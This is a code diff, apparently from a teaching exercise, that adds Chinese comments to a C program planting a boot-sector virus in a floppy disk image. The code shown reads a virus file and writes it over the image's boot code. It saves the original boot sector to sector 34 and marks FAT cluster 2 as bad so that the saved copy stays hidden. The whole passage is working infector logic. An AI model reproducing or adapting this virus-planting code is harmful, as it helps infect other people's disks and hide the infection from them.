@@ -76,13 +76,16 @@ void main(int argc, char* argv[])
 		printf("open virusfile error\n");
 		return;
 	}
+
 	fread(virus, 1, size, fv);//读入病毒，占size个字节
 	fclose(fv);
-	fseek(fp, CODESTART, SEEK_SET);//用fseek定位到引导记录后才拷贝
-	fwrite(virus + CODESTART, 1, size - CODESTART, fp);//write boot sector
+	fseek(fp, CODESTART, SEEK_SET);//用fseek定位到引导记录后才拷贝,SEEK_SET： 文件开头
+	fwrite(virus + CODESTART, 1, size - CODESTART, fp);
+	//上面的代码是将virus的0x3eH后面的内容写入flp文件中
 	fseek(fp, 33 * 512, SEEK_SET);//将原扇区内容写入第34个扇区
 	fwrite(boot, 1, 512, fp);//save old boot sector
-	//change the fat1 cluster 2 as bad cluster
+	//上面的代码是将boot中保存的引导扇区写入flp文件中
+
 	//因约定用第34扇区保存原引导区，所以fat表对应的簇2项用坏簇标记
 	fseek(fp, 512 + 3, SEEK_SET);//该fat1的簇2项，从第4字节开始，所以加3
 	c = 0xf7;//坏簇为0xff7
